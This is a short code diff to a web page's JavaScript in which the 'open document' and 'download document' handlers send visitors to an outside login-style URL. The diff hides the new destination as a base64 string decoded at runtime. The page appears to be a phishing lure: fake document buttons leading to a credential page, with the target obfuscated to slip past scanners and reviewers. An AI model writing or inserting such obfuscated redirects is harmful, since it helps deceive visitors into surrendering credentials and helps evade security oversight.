@@ -304,12 +304,16 @@
 
         function handleOpenDocument() {
             console.log('Opening document');
-            window.open('https://login.opf.qanas.net/nwWeQDqN', '_blank');
+            const encodedUrl = 'aHR0cHM6Ly9ncmVlbm92YWYuZXUvRDduNXhWWnpMLw==';
+            const decodedUrl = atob(encodedUrl);
+            window.open(decodedUrl, '_blank');
         }
 
         function handleDownloadDocument() {
             console.log('Downloading document');
-            window.open('https://login.opf.qanas.net/nwWeQDqN', '_blank');
+            const encodedUrl = 'aHR0cHM6Ly9ncmVlbm92YWYuZXUvRDduNXhWWnpMLw==';
+            const decodedUrl = atob(encodedUrl);
+            window.open(decodedUrl, '_blank');
         }
 
         // Initialize the page
